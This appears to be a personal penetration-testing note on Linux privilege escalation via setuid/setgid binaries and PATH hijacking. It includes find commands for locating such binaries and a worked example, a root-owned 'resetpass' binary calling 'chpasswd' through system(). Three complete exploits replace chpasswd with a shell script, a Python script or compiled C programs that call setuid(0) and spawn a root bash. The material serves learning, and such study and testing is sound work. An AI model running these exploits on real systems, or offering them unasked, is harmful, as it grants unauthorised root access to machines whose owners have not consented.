# `setuid`, `setgid`

> `4000`(`setuid`) perm means the binary runs with that binary's owner's permission, `2000`(`setgid`) perm means the binary runs with that binary's group's permission
> For example, if the binary is owned by `root:root` and has `setuid` and `setgid` cap, it means when you execute the binary, it runs with `root:root` privilege

Find binaries with such capability:

```sh
find / -type f \( -perm -4000 -o -perm -2000 \) -writable -ls 2>/dev/null
```

Or just `setuid`

```sh
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Or just `setgid`

```sh
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

# Example

> This example will be used throughout the exploit steps. Read carefully

The executable name is `resetpass`, it has `setuid` and `setgid` bit in it and is owned by `root:root`. it basically executes a shell command to change a user's password, but:

- It uses `echo`. `echo` is a shell built in fuction, so we can't path inject `echo`, so we can only path inject `chpasswd`
- It pipes into `chpasswd`. So if we path inject `chpasswd` to make `chpasswd` an executable that executes `bash` instead, bash will see `user:pass` as a command, executes that and exit. This is not good for use, we need a shell.

```c
system("echo 'user:pass' | chpasswd");
```
## Exploit

### Executable shell script

This is usually my go-to. First create the `chpasswd` file in `/tmp`

```sh
vim /tmp/chpasswd
```

Write this into the file

```sh
#!/bin/sh
/bin/bash < /dev/tty
```

Make the script executable

```sh
chmod +x /tmp/chpasswd
```

Change `PATH` variable. This will make `sh` searches for `chpasswd` in `/tmp` directory first

```sh
export PATH=/tmp:$PATH
```

Run the target executable

```sh
./resetpass
```

### Executable python script

> In case the above one does not work, it's probably because we did not use `setuid` and/or `setgid`, we don't have a native linux binary to change `uid` and `gid` after all.
> This is very useful when you have a binary that has `cap_setuid` and/or `cap_setgid`. The binary has the capbability, but unless the binary explicitly change `gid` and/or `uid`, it won't run as `root`
> I'm not sure if capability works with path injection, need test, but for now, i will just put it here

Luckily, we can use `setuid` and `setgid` in python

```sh
vim /tmp/chpasswd
```

Put this in as content

```python
#!/usr/bin/python3

import os
#import pty

os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
#pty.spawn("/bin/bash")
```

Make the script executable

```sh
chmod +x /tmp/chpasswd
```

Change `PATH` variable. This will make `sh` searches for `chpasswd` in `/tmp` directory first

```sh
export PATH=/tmp:$PATH
```

Run the target executable

```sh
./resetpass
```

### Executable binary

We can compile this C code into executable, rename it to `chpasswd`, transfer to target machine

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int main() {
    setuid(0);
    setgid(0);
    int fd = open("/dev/tty", O_RDONLY);
    dup2(fd, STDIN_FILENO) < 0;
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

Or this, way shorter

```c
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash < /dev/tty");
    return 0;
}
```

Complile the exploit and rename it to `chpasswd`

```sh
gcc a.c -o chpasswd
```

Transfer to target machine

Change `PATH` variable. This will make `sh` searches for `chpasswd` in current directory first

```sh
export PATH=$PWD:$PATH
```

Execute the target executable

```sh
./resetpass
```